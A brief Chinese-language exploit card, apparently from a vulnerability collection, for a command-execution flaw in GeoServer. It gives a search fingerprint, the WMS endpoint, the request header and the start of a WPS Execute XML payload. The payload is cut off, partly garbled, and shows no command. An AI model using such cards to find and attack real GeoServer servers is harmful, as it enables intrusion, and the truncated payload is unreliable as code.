# Geoserver存在命令执行漏洞

- **系统**：GeoServer　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`"geoserver"`
- **请求**：`POST /geoserver/wms HTTP/1.1`
- **关键头**：`Content-Type: application/xml`

**请求体 / payload**
```
<?xml version="1.0" encoding="UTF-8"?>
<wps:Execute version="1.0.0" service="WPS" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://www.opengis.net/wps/1.0.0" xmlns:wfs="http://www.opengis.net/wfs" xmlns:wps="http://www.opengis.net/wps/1.0.0" xmlns:ows="http://www.opengis.net/ows/1.1" xmlns:gml="http://www.opengis.net/gml" xmlns:ogc="http://www.opengis.net/ogc" xmlns:wcs="http://www.opengis.net/wcs/1.1.1" xmlns:xlink="http://www.w3.org/1999/xlink" xsi:schemaLocation="http://www.opengis.net/wps/1.0.0 [http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd">](http://schemas.opengis.ne…（脚本共 1814 字，完整版见原文）
```